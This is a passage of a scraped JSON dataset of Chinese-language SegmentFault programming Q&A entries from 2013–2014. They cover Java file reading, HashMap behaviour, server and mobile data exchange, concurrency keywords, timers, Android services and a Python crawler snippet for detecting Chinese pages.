      "dsc": "<div class=\"question fmt\" data-id=\"1010000000359840\">\n<p>最近文件操作较多，但大多数都是一行一行地读取，每一行是一条新闻。经常用的代码是这样的：</p>\n<pre><code class=\"lang-java\">InputStream is = null;\ntry {\n    is = new FileInputStream(textPath);\n    BufferedReader reader = new BufferedReader(new InputStreamReader(is, \"UTF-8\"), 512);\n    // 读取一行，存储于字符串列表中\n    for (String line = reader.readLine(); line != null; line = reader.readLine()) {\n        line = line.trim();\n        // do something here\n    }\n\n}catch (FileNotFoundException fnfe){\n    fnfe.printStackTrace();\n}catch (IOException ioe){\n    ioe.printStackTrace();\n} finally {\n    try {\n        if (is != null) {\n            is.close();\n            is = null;\n        }\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}\n\n</code></pre>\n<p>当do something变得很庞大时，这try语句块就变得有点臃肿。是否能存在这样的一个文件读取类，就像Iterator迭代器一样，使用hasNext()和next()遍历文件中的所有行，而将异常处理等全部隐藏起来？还是有什么其它更加优雅的方法？</p>\n</div>",
      "favourite": "4",
      "glance": "9.5k",
      "tags": [
        "java",
        "文件读取"
      ],
      "time": "2013-12-13",
      "title": "如何优雅地读取文件中的每一行？",
      "url": "https://segmentfault.com/q/1010000000359840"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000361374\">\n<p>每次都是 <code>put</code> 相同的值，那么 <code>keySet</code> 得到的 <code>Key</code> 的顺序都是固定的么？</p>\n<p>我自己试的确是这样的，基本确定是固定的，看源码肯定更清楚了，自己懒。。。</p>\n<p>我想这个 <code>KeySet</code> 顺序取决于 <code>put</code> 时散列值，这个散列值和什么相关呢，会不会换台机器或者换个 <code>jdk</code> 版本这个值就会有影响呢？</p>\n</div>",
      "favourite": "1",
      "glance": "2.6k",
      "tags": [
        "java"
      ],
      "time": "2013-12-16",
      "title": "HashMap的keySet()顺序问题",
      "url": "https://segmentfault.com/q/1010000000361374"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000376267\">\n<p>了解一下Restlet或者jersey这种服务框架，借助于它们能快速搭建起server端程序对外提供服务。Restlet还提供了大量的插件来满足不同格式的数据传入和输出。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000376407\">\n<p>按照自己的思路去学，哪里不懂谷歌哪里，疑问各个击破。</p>\n<p>不要想太多，想多了不容易成功。</p>\n<p>别管怎么做，去做就好了。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000364524\">\n<p>1. 了解一下什么是 HTTP 协议，什么是 GET 请求，什么是 POST 请求。</p>\n<p>学会使用一些工具查看 HTTP 请求：</p>\n<ul>\n<li>Firefox 的 firebug</li>\n<li>Chrome 的 F12</li>\n<li>使用 curl 命令发请求和调试</li>\n</ul>\n<p>2. Java 相关</p>\n<ol>\n<li>学习一下 Java 的 Servlet API</li>\n<li>war 工程的结构，比如 WEB-INF 是干什么用的，如何写 web.xml</li>\n<li>如何在 tomcat 上部署 war</li>\n<li>如何使用 Maven 或 eclipse 管理 war 工程</li>\n</ol>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000364063\">\n<p>大家好，我想用java写一个server端，用来接收图片，json等格式的数据，并且在接收、处理以后发送回文本结果。</p>\n<p>我会java，但对上面需要用到的知识一窍不通，请问我该怎么入手？</p>\n<p>感谢！</p>\n</div>",
      "favourite": "1",
      "glance": "2.7k",
      "tags": [
        "java",
        "server"
      ],
      "time": "2013-12-18",
      "title": "怎样用java写server端？",
      "url": "https://segmentfault.com/q/1010000000364063"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000401122\">\n<p>1，xml和json不是语言，是数据格式。广泛用于数据交换。<br>\n2，不用这个也无妨，只要你的服务器，客户端可以互相收发消息即可。如果你愿意，甚至自己base64一遍直接互相传也行。<br>\n3，xml和json之所以流行的原因是各个语言基本内置了解析它们的函数，可以直接上手很方便。<br>\n4，聊天室对实时性和消息存储（离线消息）都有要求，至少你要熟练掌握数据库使用，以及完成数据实时交互要求的技术，可以是ajax poll，也可以是socket。</br></br></br></p>\n<p>你问的问题可以看出，你粗懂技术，对语言了解些但是基础很差，像是半路出家，我给你一组关键词，你按顺序全部掌握后方可无障碍开发自己的产品。<br>\na，http协议<br>\nb，dns和站点的原理<br>\nc，web服务器<br>\nd，php或其它任何一种web开发语言<br>\ne，php作为脚本语言的缺陷<br>\nf，restful api<br>\ng，javascript 和 ajax<br>\nh，websocket<br>\ni，web和移动app的区别和相同点<br>\nj，为什么我们把web也当作和app一样，都作为客户端的一种<br>\nk，mysql或其它数据库</br></br></br></br></br></br></br></br></br></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000375665\">\n<p>JSON 和 XML的比较网上多的是吧。<br/>\n以下是一比较的链接。<br/>\n<a href=\"http://blog.sina.com.cn/s/blog_8a30865f0101amjh.html\" rel=\"nofollow\">http://blog.sina.com.cn/s/blog_8a30865f0101amjh.html</a><br/>\n我倾向于使用JSON。简单而且省流量啊。<br/>\n聊天室就不得而知了。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000375676\">\n<p>楼主提出的问题很庞大，但也很简单。我就粗略回答你一下，具体的内容楼主回去可以慢慢搜索。</p>\n<h2>后端</h2>\n<p>客户端向服务器请求数据采用的方式就是http，数据格式用xml或者json问题都不大，但是对于初学者还是json比较容易上手一些，xml显得太重型了。不同语言都有这两种数据的解析库，其中javascript处理json最简单了，一个JSON.parse函数就行。</p>\n<p>数据请求建议做成RESTful风格的，这样可以照顾来自不同客户端的请求，大多数开放平台的接口用的都是RESTful风格。</p>\n<p>关于聊天室和实施显示这个东西嘛。。。Ajax的long pulling知道吗？不知道的话，那“请求超时”这个词听说过吧。如果我把超时时间设置的很久，或者干脆取消，这时客户端向服务器发送数据请求，服务器就先把这个请求放在一边，客户端就在那里等着，服务器在有数据进来的时候才返回给客户端。long pulling的意思差不多就是这样，如果做web开发的话有个现成的库<a href=\"http://socket.io/\" rel=\"nofollow\">socket.io</a>把这些功能都封装起来了，你可以参考一下。</p>\n<h2>客户端</h2>\n<p>楼主提出的需求是跨三个平台，那我就以一个没有做过移动端开发的人给你提供几个不成熟的方案。</p>\n<h3>做一个WebApp</h3>\n<p>这个是最简单，最省力的方法，但前提是要对自适应布局等css的运用要很熟练，也就是说前端功底要扎实。页面最好做成SPA(Single Page App），单页面，不然每次点击链接整个页面都要刷新一次效果不好。做好之后再封装成本地app，<a href=\"http://developer.android.com/guide/webapps/index.html\" rel=\"nofollow\">android</a>的网站上有相关资料。</p>\n<h3>用跨手机平台的技术框架</h3>\n<p>使用如QT或者<a href=\"http://phonegap.com/\" rel=\"nofollow\">PhoneGap</a>这些技术，可以使程序运行在不同的移动终端。但是我没有相关开发经验，所以相关内容还需楼主自行Google。</p>\n<h3>为每个平台单独制作App</h3>\n<p>这样你可能需要找几个术业有专攻的小伙伴来帮你了。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000375424\">\n<p>小弟准备做毕业设计项目，</p>\n<p>项目涉及到开发web网站、Android和IOS移动客户端，</p>\n<p>由于初次接触开发移动客户端，</p>\n<p>对其很多知识、技术并不了解，</p>\n<p>特来请教各位，先行谢过各位。</p>\n<p>网站采用PHP框架yii开发、移动端两种语言就不说了，</p>\n<p>移动客户端与网站服务端的数据交换、传输用什么技术？</p>\n<p>来着之前，小弟百度过，得知用XML、JSON技术，</p>\n<p>如何在两种语言中如何实现？请各位大神简单说明下</p>\n<p>还有这两种技术有什么优、劣，也做个简单说明？</p>\n<p>除此之外，还有没有别的技术？</p>\n<p>如果涉及到聊天室、实时显示的功能用哪些技术？</p>\n<p>本人问题较多，请莫怪</p>\n<p>再次感谢各位大神！</p>\n</div>",
      "favourite": "9",
      "glance": "8.3k",
      "tags": [
        "android",
        "ios",
        "java",
        "xml",
        "json"
      ],
      "time": "2014-01-02",
      "title": "网站与客户端（Android、IOS）之间的数据交换、传输相关问题",
      "url": "https://segmentfault.com/q/1010000000375424"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000383290\">\n<p>用户名张三唯一,也即其他用户不能再注册张三这个名字.</p>\n<p>技术上是如何实现的?</p>\n<p>Redis上锁? 乐观锁?</p>\n<pre><code>jedis.set(\"users\".getBytes(), serialize(userBean));\n</code></pre>\n<p>其中:</p>\n<pre><code>UserBean class\nprivate Map&lt;String, User&gt; users = new HashMap&lt;String, User&gt;();\n</code></pre>\n<p>更新：已经解决，不用 Map&lt;String, User&gt; users 存储即可。 Map存储的话会有线程安全问题。改成单个存储就Ok了。</p>\n</div>",
      "favourite": "1",
      "glance": "1.7k",
      "tags": [
        "game",
        "redis",
        "java",
        "锁"
      ],
      "time": "2014-01-10",
      "title": "游戏刚开服时,很多玩家同时注册,那么好多玩家同时注册一个名字(例如张三)的话,技术上是怎么解决的?",
      "url": "https://segmentfault.com/q/1010000000383290"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000388146\">\n<p>最近想做个web的实时分析系统。<br>\n功能主要有：数据采集、数据存储分析、web展示等。</br></p>\n<p>采集和分析没什么问题，最大的难点就是web实时通讯，看到网上有websocket\\longpoll\\flash等不同的方案来解决浏览器的兼容问题。也了解了一下socket.io，觉得非常不错，网上有几个采用netty实现的后台组件。后台服务器为tomcat和glassfish，要求能兼容所有主流浏览器。</p>\n<p>望有相关经验的人指导：<br>\n 1. socket.io+tomcat+netty-java-client方案可行吗？<br>\n 2. 就是这个方案是最好的吗？<br>\n 3. 并发数预估不会超过1000，有压力吗？</br></br></br></p>\n</div>",
      "favourite": "0",
      "glance": "2.1k",
      "tags": [
        "java",
        "socket.io",
        "websocket",
        "javascript",
        "netty"
      ],
      "time": "2014-01-15",
      "title": "实时Web通讯设计",
      "url": "https://segmentfault.com/q/1010000000388146"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000399504\">\n<p>RT.想测试下MappedByteBuffer的put方法会不会写入磁盘,如下:</p>\n<pre><code>FileChannel filechannel=new RandomAccessFile(\"mydata\",\"rw\").getChannel();\nMappedByteBuffer mappedbytebuffer=filechannel.map(FileChannel.MapMode.READ_WRITE, 0, 10);\nmappedbytebuffer.put((byte)'a');\nmappedbytebuffer.put((byte)'b');\nmappedbytebuffer.put((byte)'c');\n</code></pre>\n<p>在每次put的时候加个断点,同时看磁盘上的数据,确实是每次都发生了变化.<br>\n和预想的不一样,本来以为put不会立刻改变磁盘数据(pagecache), 要用force才能刷到磁盘.</br></p>\n<p>这是啥原因?</p>\n</div>",
      "favourite": "1",
      "glance": "2.8k",
      "tags": [
        "java"
      ],
      "time": "2014-01-27",
      "title": "调用java 中的MappedByteBuffer的put方法,是直接写入磁盘么?",
      "url": "https://segmentfault.com/q/1010000000399504"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000403501\">\n<p>现代的Java已经支持闭包了。</p>\n<p>标准的C不支持闭包。gcc和clang倒是有blocks扩展。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000431413\">\n<p>我想说 Java 的「闭包」很蛋疼... 被闭包引用的「域外」变量只能是 <code>final</code> 的，而且可读性很差，引用 <a href=\"https://code.google.com/p/guava-libraries/wiki/FunctionalExplained\" rel=\"nofollow\">guava</a>的一个例子，自己比较下：</p>\n<p>「二比青年版」：</p>\n<pre><code>Multiset&lt;Integer&gt; lengths = HashMultiset.create(\n  FluentIterable.from(strings)\n    .filter(new Predicate&lt;String&gt;() {\n       public boolean apply(String string) {\n         return CharMatcher.JAVA_UPPER_CASE.matchesAllOf(string);\n       }\n     })\n    .transform(new Function&lt;String, Integer&gt;() {\n       public Integer apply(String string) {\n         return string.length();\n       }\n     }));\n</code></pre>\n<p>这里 <code>Predicate</code> 和 <code>Function</code> 匿名类就是「闭包」，分别实现了 <code>Predicate</code> 接口和 <code>Function</code> 接口。看看这一坨代码... Java 中慎用这种「编码模式」！</p>\n<p>「普通青年版」：</p>\n<pre><code class=\"lang-java\">Multiset&lt;Integer&gt; lengths = HashMultiset.create();\nfor (String string : strings) {\n  if (CharMatcher.JAVA_UPPER_CASE.matchesAllOf(string)) {\n    lengths.add(string.length());\n  }\n}\n</code></pre>\n<p>短平快，可读性好！</p>\n<p>「文艺青年版」：</p>\n<pre><code class=\"lang-clojure\">(-&gt;&gt; strings\n    (filter #(.matchesAllOf % CharMatcher/JAVA_UPPER_CASE))\n    (map #(.length %))\n    (HashMultiset/create))\n</code></pre>\n<p>当然，对于动态语言来说，太小菜了。</p>\n<p>以后 Java 8 普及了，支持 Lambda 表达式，估计会好一些。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000413654\">\n<p>c语言不熟悉，java中的闭包是通过“接口+内部类”实现的<br>\n以下是网上的一个例子</br></p>\n<pre><code class=\"lang-java\">public class DemoClass1 {\n    private int length =0;\n\n    //private|public\n    private class InnerClass implements ILog\n    {\n        @Override\n        public void Write(String message) {\n            //DemoClass1.this.length = message.length();\n            length = message.length();\n            System.out.println(\"DemoClass1.InnerClass:\" + length);\n        }\n    }\n\n    public ILog logger() {\n        return new InnerClass();\n    }\n\n    public static void main(String[] args){\n        DemoClass1 demoClass1 = new DemoClass1();\n        demoClass1.logger().Write(\"abc\");\n\n        //.new\n        DemoClass1 dc1 = new DemoClass1();\n        InnerClass ic = dc1.new InnerClass();\n        ic.Write(\"abcde\");\n    }\n}\n</code></pre>\n<p>可以参考下这个博客<a href=\"http://www.cnblogs.com/chenjunbiao/archive/2011/01/26/1944417.html\" rel=\"nofollow\">http://www.cnblogs.com/chenjunbiao/archive/2011/01/26/1944417.html</a></p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000403335\">\n<p>js go python 实现闭包貌似很简单</p>\n</div>",
      "favourite": "3",
      "glance": "3.3k",
      "tags": [
        "闭包",
        "c",
        "java"
      ],
      "time": "2014-02-05",
      "title": "c语言和java如何实现闭包？",
      "url": "https://segmentfault.com/q/1010000000403335"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000407928\">\n<p>对于java本身提供的功能来说, 就是Timer 和 ScheduledThreadPoolExecutor了.</p>\n<p>我找了这个网页:<br><a href=\"http://dumb-coder.blogspot.sg/2012/10/timer-vs-scheduledthreadpoolexecutor.html\" rel=\"nofollow\"></a><a href=\"http://dumb-coder.blogspot.sg/2012/10/timer-vs-scheduledthreadpoolexecutor.html\" rel=\"nofollow\">http://dumb-coder.blogspot.sg/2012/10/timer-vs-scheduledthreadpoolexecutor.html</a></br></p>\n<p>和我一直的理解是一致的. 每一个Timer对应一个后台线程, 其接收到的TimerTasker 被放入队列中(具体实现应该是一个小顶堆). 适合少量的, 短的任务.</p>\n<p>如果要处理多个, 长时间的任务, 并且对时间 和 并行处理有要求的, 用ScheduledThreadPoolExecutor.</p>\n<hr>\n<p>如果在Java EE环境下, 还可以考虑EJB timer<br><a href=\"http://docs.oracle.com/javaee/6/tutorial/doc/bnboy.html\" rel=\"nofollow\">http://docs.oracle.com/javaee/6/tutorial/doc/bnboy.html</a></br></p>\n<p>以前用过, 印象最深的就是 1). 可以和transaction一起用, 如果事务回滚, timer的创建/取消也会回滚.  2). persistent. 应用服务器重启后, timer不会丢失.</p>\n</hr></div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000408057\">\n<p>spring task , 如果你在用spring的话</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000407920\">\n<p><a href=\"http://www.ibm.com/developerworks/cn/java/j-quartz/\" rel=\"nofollow\">用 Quartz 进行作业调度</a></p>\n<blockquote>\n<p>Quartz 是个开放源码项目，提供了丰富的作业调度集。在这篇文章中，软件工程师 Michael Lipton 和 IT 架构师<br>\n  Soobaek Jang 对 Quartz API 进行了介绍，从对框架的一般概述开始，并以一系列展示 Quart<br>\n  基本特性的代码示例作为结束。在阅读完本文并看过代码示例后，您应当能够把 Quartz 的基本特性应用到任何 Java™ 应用程序中。</br></br></p>\n</blockquote>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000407859\">\n<p>想实现一个功能，需要定期查看一个表，并发送消息。<br>\n在Java中，有哪些好的实现方案？资源耗费情况如何？容错能力好的有哪些？</br></p>\n<p>请高手支招。</p>\n<p>谢谢。</p>\n</div>",
      "favourite": "6",
      "glance": "5.9k",
      "tags": [
        "java",
        "程序"
      ],
      "time": "2014-02-13",
      "title": "Java中定时器功能有哪些好的实现方案？",
      "url": "https://segmentfault.com/q/1010000000407859"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000409705\">\n<p>感觉join就可以解决问题啊，为什么要有CyclicBarrier和CountDownLatch</p>\n</div>",
      "favourite": "1",
      "glance": "2.2k",
      "tags": [
        "java",
        "线程",
        "多线程"
      ],
      "time": "2014-02-16",
      "title": "Java中用CyclicBarrier以及CountDownLatch和join相比有什么不同",
      "url": "https://segmentfault.com/q/1010000000409705"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000414418\">\n<ol>\n<li><p><code>hash bucket</code>，据说是一个单向链表，可不可以说是一个栈？</p></li>\n<li><p><code>HashMap::get()</code> 可以获取 bucket 里面的第一个元素，那其它元素又怎么获取？</p></li>\n<li><p><code>HashMap::size()</code> 是返回 bucket 的个数还是长度大于 0 的 bucket 的个数？</p></li>\n</ol>\n</div>",
      "favourite": "1",
      "glance": "2.5k",
      "tags": [
        "java",
        "hashmap",
        "hash-bucket"
      ],
      "time": "2014-02-20",
      "title": "HashMap中hash桶的疑惑",
      "url": "https://segmentfault.com/q/1010000000414418"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000415917\">\n<html><body>\n<p>关于service的一些问题：</p>\n<ol>\n<li><p>在使用微信和微博时,打开android的\"设置-应用-正在运行\"里面,能看到微信和微博两个应用同时在运行,里面有各自的进程和服务。请问这是如何实现的？</p></li>\n<li><p>现在想给自己的应用加上推送服务，把服务以独立进程运行起来了。可是开启应用后，点主菜单的应用列表键，显示的应用滑动关闭后，应用的全部进程就被杀死了。（如图，PushTest按住往箭头方向滑动就关闭了，进程全部被杀死）请问进程如何能不被杀死呢？顺便问一下，红色框里的按键叫什么键？</p></li>\n<li><p>多个APP是否可以共享service？想多个APP共享一个service的推送功能，这样就只需要维持一个长链接和其相关的通信心跳了。目前service是做成单独的jar包导入其他APP工程的，是否需要把service做成单独的APP？</p></li>\n</ol>\n<p>图：<br><img data-src=\"http://segmentfault.com/img/bVbUo8\"><br><img data-src=\"http://segmentfault.com/img/bVbUmu\"/></br></img></br></p>\n</body></html>\n</div>",
      "favourite": "6",
      "glance": "11.3k",
      "tags": [
        "android",
        "java",
        "push-notification"
      ],
      "time": "2014-02-21",
      "title": "Android开发，关于service的常驻和共享的问题",
      "url": "https://segmentfault.com/q/1010000000415917"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000422400\">\n<p><a href=\"http://blog.sina.com.cn/s/blog_7d17f3cc01014dva.html\" rel=\"nofollow\">http://blog.sina.com.cn/s/blog_7d17f3cc01014dva.html</a>文章中说道一句话，“在使用自定义对象做key的时候，一定要去实现hashcode方法，不然hashmap就成了纯粹的链表，查找性能非常的慢，添加节点元素也非常的慢”<br>\n我非常不理解，主要不理解这个hashcode是怎么算的呢，如果根据对象地址来算的话，也不会出现上面说的问题</br></p>\n</div>",
      "favourite": "0",
      "glance": "2.4k",
      "tags": [
        "java",
        "hashmap"
      ],
      "time": "2014-03-02",
      "title": "关于hashmap中hashcode的问题",
      "url": "https://segmentfault.com/q/1010000000422400"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000423190\">\n<p>楼上的解释很好. 我做一点补充:</p>\n<p>说到java reader缓存, 其实有两层缓存:<br>\n1. OS缓存, 把磁盘数据 读入内存, 通过read ahead, io scheduler等减少磁盘读取次数.<br>\n2. App缓存, 做缓存/预读, 即BufferredReader的角色.</br></br></p>\n<p>BufferredReader的作用, 我的理解, 一) 减少System Call次数; 二) 减少磁盘读取次数.</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000432176\">\n<p>我记得很久以前写过一个内部使用Byte数组的BufferedStreamReader，实测效率比原本使用Char数组的要快，不过这只是在32位系统下测试的。写这个StreamReader是为了修正文件上传组件里原本的效率问题。</p>\n<p>实际上BufferedReader和StreamReader（例如FileReader就是一个StreamReader）的用途是不同的，流（Stream）数据就应该用byte数组以取得最大效率。而BufferedReader的作用并不是读取一堆流式数据，而是针对带有换行符的文本内容的按行读取，同时要正确处理各种字符集的文本数据。</p>\n<p>明白BufferedReader的真正用途就很容易理解，为何内部使用Char数组，因为Java的字符和字符串都是双字节的，以解决多种字符集的问题。</p>\n<p>BufferedReader一般创建时需要一个StreamReader的参数，由StreamReader去用流的方式读取数据。而BufferedReader只是解析流数据并组成一行一行的String。</p>\n<p>因此，BufferedReader的Buffer也是具有非常重要的用途，按字符集解析流数据，组成Char数组，这个过程一定是需要预读取的。然后才是基于Buffer，辨析Windows和Linux不同换行符\\n\\r，解析出一行String返回。</p>\n<p>用了Buffer当然还是需要从Byte到Char的转换，只不过比之不用Buffer，效率会有数量级的提高。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000422521\">\n<p>没有缓冲区时，<strong>每次</strong>读取操作都会导致一次文件读取操作（就是告诉操作系统内核我要读这个文件的这个部分，麻烦你帮我把它取过来）。而有缓冲区时，会一次性读取很多数据，然后按要求分次交给上层调用者。读取块大小通常是按最适合硬件的大小来读的，因为对于硬件来说，一次读取一块连续数据（比如 1K）和一次读取一个字节需要的时间几乎是一样的（都是一次读操作，只是最终提交的数据量有差异）。带缓冲的 I/O 和不带缓冲的相比效率差异是非常显著的，你可以自行写程序测试。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000422506\">\n<pre><code>BufferedReader in = new BufferedReader(new FileReader(\"foo.in\"));\n</code></pre>\n<blockquote>\n<p>will buffer the input from the specified file. Without buffering, each<br>\n  invocation of read() or readLine() could cause bytes to be read from<br>\n  the file, converted into characters, and then returned, which can be<br>\n  very inefficient.</br></br></br></p>\n</blockquote>\n<p>这段话怎么理解，如果使用了缓冲区就不会涉及到byte转character？<br>\n求两个读取文件的流程和效率对比，先行谢过了。</br></p>\n</div>",
      "favourite": "5",
      "glance": "7.1k",
      "tags": [
        "java",
        "bufferedreader"
      ],
      "time": "2014-03-02",
      "title": "关于Java中使用BufferedReader读取文件的疑惑",
      "url": "https://segmentfault.com/q/1010000000422506"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000432461\">\n<p>用于修饰 多线程共享变量。使用此关键字保证jvm不会从线程变量中读写，而是直接操作共享变量</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000432561\">\n<p>我的理解是：如果有一个变量，有多个线程读，但只有一个线程写，那么此变量用 volatile 可以保证读到正确的值。volatile 的一个经典的应用是 <a href=\"http://zh.wikipedia.org/wiki/%E5%8F%8C%E9%87%8D%E6%A3%80%E6%9F%A5%E9%94%81%E5%AE%9A%E6%A8%A1%E5%BC%8F\" rel=\"nofollow\">Double-checked locking</a> ，它是一种在多线程环境下正确且高效地实现单例模式的方法。</p>\n<p>参考：</p>\n<ul>\n<li><a href=\"http://segmentfault.com/q/1010000000254298\" rel=\"nofollow\">java 多线程读一个变量需要加锁吗</a></li>\n</ul>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000424627\">\n<p>关于java volatile, 我有几点说明,</p>\n<ul>\n<li><p>volatile保证 可见性. 即线程得到的 值是 最新的. Thread1 改变了 var的值, 那么Thread2再去读, 就是改变了的值, 而不是以前的. 再具体一点, 我的理解是这样(有误请指出), 现代计算机都是多核或多cpu, 一个变量可能在同一时间, 存在与不同的cpu的 寄存器里. 如果没有volatile做保证, 那么同一时间 统一变量会有不同的值. volatile保证每次都是从 主存中读取/写入 变量的值, 从而保证可见性.</p></li>\n<li><p>volatile保证 编译器不会过度优化. 见过以下的例子, 大概的代码是这样:</p></li>\n</ul>\n<pre><code class=\"lang-java\">    public class Thread1 extends Thread {\n      private boolean flag = false;\n      public void run() {\n        while(!flag) {\n          // ...\n        }\n      }\n      public void close() {\n        flag = true;\n      }\n    }\n</code></pre>\n<p>但是在外部进程调用close()后, Thread1并没有退出. 用了jdk debug版本 拿到了hotspot 的汇编码. 发现这里while(!flag) 被编译器优化为 while(true).</p>\n<ul>\n<li>对long或double来说, 读写不是 原子操作. 加了volatile, 对long或double的读写为 原子操作.</li>\n</ul>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000424543\">\n<p><code>volatile</code> 关键字都知道是不能做到线程同步的，只能保证线程之间尽快的获取最新的值，像 <code>concurrentHashmap</code> 之间 <code>value</code> 的修饰就用到了 <code>volatile</code>，我感觉这个关键在没啥用的感觉，，，求解释。</p>\n<p>或者说 <code>volatile</code>变量修饰符适用于什么场景？</p>\n</div>",
      "favourite": "2",
      "glance": "4.4k",
      "tags": [
        "java"
      ],
      "time": "2014-03-05",
      "title": "java关键字volatile的作用",
      "url": "https://segmentfault.com/q/1010000000424543"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000478874\">\n<p>过了N久，今天总算有时间实验一下了。下面是我综合@依云 和@Syeerzy 的解决方案，谢谢大家的回答。</p>\n<pre><code>#! /usr/bin/env python\n# -*- encoding: utf-8 -*-\nimport requests\nimport cld2\n\nclass Detector(object):\n    zh_cn_encodes = ('gbk', 'gb2312', 'gb18030')\n    def __init__(self, context):\n        self.context = context\n\n    def is_zh_cn_encoding(self, ctype):\n        ctype = ctype.lower()\n        for ec in self.zh_cn_encodes:\n            if ec in ctype:\n                return True\n        return False\n\n    def detect(self):\n        assert type(self.context) == type(u''), 'detect unicode string only'\n        ret = cld2.detect(self.context.encode('utf-8'))\n        return ret[2][0][1] == 'zh'\n\n    def url_detect(self):\n        r = requests.get(self.context)\n        assert r.status_code == 200, 'http code 200 is required'\n        ctype = r.encoding\n        if ctype and self.is_zh_cn_encoding(ctype):\n            return True\n        else:\n            self.context = r.text\n            return self.detect()\n\nif __name__ == '__main__':\n    print Detector(u'短中文有bug').detect()\n    print Detector(u'网页文件一般没问题').detect()\n    print Detector(u'これは日本で').detect()\n    url = 'http://segmentfault.com/q/1010000000432652'\n    print Detector(url).url_detect()\n    url = 'https://code.google.com/p/chromium-compact-language-detector/source/browse/README'\n    print Detector(url).url_detect()\n</code></pre>\n<p>输出是</p>\n<pre><code>False\nTrue\nFalse\nTrue\nFalse\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000439062\">\n<p>首先取响应头里的编码,<br>\n    如果是几种中文编码之一,则认为中文网页,<br>\n    如果不是中文编码, 也不是几种unicode方案之一, 则不是中文.<br>\n    否则再在&lt;head&gt;标签里找 charset ,<br>\n        如果有并且为几种中文编码之一, 则是中文<br>\n        如果不是中文编码, 也不是几种unicode方案之一, 则不是中文.<br>\n        否则对body的内容(如果考虑性能问题,可以不对整个body,只对前N个字节)用正则洗标签<br>\n            过滤所有ASCII码字符, 剩余部分按字取内码,<br>\n            如果考虑性能问题其实取第一个字符就可以了,<br>\n            如果性能不重要,可以多采样几个(防止一个页面有中文日文等各种文字混合)<br>\n                判断采到的字符的内码是否位于中文unicode区域.</br></br></br></br></br></br></br></br></br></br></p>\n<p><em>(PS: 如果性能非常不重要, 只是要代码简单, 那么做法可以: 正则   [^\\x00-\\xff]  这样可以取到第一个不是ASCII的字符, 判断这个字符是否是中文字符就可以了)</em></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000432714\">\n<p>用 Google Chrome 的<a href=\"https://code.google.com/p/cld2/\" rel=\"nofollow\">识别算法</a>吧，支持 HTML，有 <a href=\"https://code.google.com/p/chromium-compact-language-detector/\" rel=\"nofollow\">Python 绑定</a>。</p>\n</div>",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000432652\">\n<p>因定制内容较多，暂时无发现现有爬虫框架满足要求，所以需要自己写（用redis做队列）。<br>\n我的问题是在爬虫得到一个网页之后，<strong>怎么识别出这个网页是否为中文网页</strong>？</br></p>\n</div>",
      "favourite": "13",
      "glance": "3.7k",
      "tags": [
        "网页爬虫",
        "java",
        "python",
        "网页开发"
      ],
      "time": "2014-03-13",
      "title": "我正在写一个爬虫，怎么通过网页内容误别出是否为中文网页？",
      "url": "https://segmentfault.com/q/1010000000432652"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
